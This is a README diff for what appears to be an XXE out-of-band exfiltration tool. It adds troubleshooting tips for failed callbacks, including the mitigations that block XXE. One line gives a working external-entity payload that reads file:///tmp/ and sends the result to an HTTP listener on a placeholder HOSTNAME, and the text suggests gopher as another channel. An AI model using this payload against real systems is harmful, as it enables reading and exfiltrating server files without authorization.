@@ -67,3 +67,13 @@ info: FTP: recvd 'RETR b'
   * Install via ``pip``. Needs at least a requirements.txt or a setup.py. For now just clone and run.
   * Currently serves up everything in the folder in which it was run over HTTP. Probably not a huge security risk, but something you should be aware of, espeially on a public server.
   * Integrated server file/directory browsing as a future upgrade?
+
+## Troubleshooting
+  * I don't get a callback over HTTP to retrieve ``ext.dtd``.
+    * This could mean a number of things, mostly related to not being vulnerable to XXE:
+      * External entities may be disallowed. This can be done by rejecting DOCTYPE decclarations in documents, which I believe prevents XXE injection.
+      * It may also allow entities, but disallow entities from remote sources. I've seen this on some Python XML libraries.
+      * Outbound traffic could be blocked at a firewall, or requests mat only go to whitelisted hosts.
+    * There could also be a type in the payload or a bug. Check the generated ``ext.dtd`` file to make sure everything looks correct. 
+  * The initial HTTP callback for ext.dtd works, but after that I see nothing.
+    * This could mean that FTP as a protocol is disabled server-side. Try changing the FTP callback in ``ext.dtd`` to an HTTP one, like ``<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'http://HOSTNAME:2121/b'>">``. If you get a callback to the /b document, this is probably the case. Try using the gopher protocol as well, but this was removed in Java 1.6.32 (or something close).
